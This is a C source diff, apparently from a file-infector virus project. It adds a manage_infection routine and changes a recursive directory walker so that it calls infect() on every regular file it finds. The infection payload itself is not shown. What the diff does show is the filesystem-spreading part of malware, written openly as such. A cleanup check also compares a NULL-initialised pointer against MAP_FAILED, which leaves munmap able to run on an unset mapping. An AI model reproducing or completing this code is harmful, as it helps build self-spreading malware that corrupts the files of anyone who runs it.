@@ -16,9 +16,32 @@ void print_path(char *path, char *d_name, t_arg_data *data)
     printf("%s/%s\n", path, d_name);
 }
 
+void init_file(t_file *file, char *file_name)
+{
+    file->fd = -1;
+    file->file_data = NULL;
+    file->file_name = file_name;
+    file->complet_file_name = NULL;
+}
+
+void manage_infection(char *path, char *file_name, t_file *file, t_arg_data *data)
+{
+    init_file(file, file_name);
+    if (parse_file(path, file_name, file, data))
+        infect(file);
+
+    if (file->fd > 0)
+        close(file->fd);
+    if (file->complet_file_name)
+        free(file->complet_file_name);
+    if (file->file_data != MAP_FAILED)
+        munmap(file->file_data, file->size_mmap);
+}
+
 void read_dir(t_arg_data *data, char *path)
 {
     struct dirent* entity;
+    t_file file;
 
     DIR* dir = opendir(path);
     if (!dir)
@@ -30,7 +53,9 @@ void read_dir(t_arg_data *data, char *path)
     while (entity)
     {
         print_path(path, entity->d_name, data);
-        if (entity->d_type == 4 && strcmp(entity->d_name, ".") && strcmp(entity->d_name, ".."))
+        if (entity->d_type == DT_REG)
+            manage_infection(path, entity->d_name, &file, data);
+        if (entity->d_type == DT_DIR && strcmp(entity->d_name, ".") && strcmp(entity->d_name, ".."))
         {
             char *new_path = calloc(strlen(entity->d_name) + strlen(path) + 2, sizeof(char));
             strcat(new_path, path);
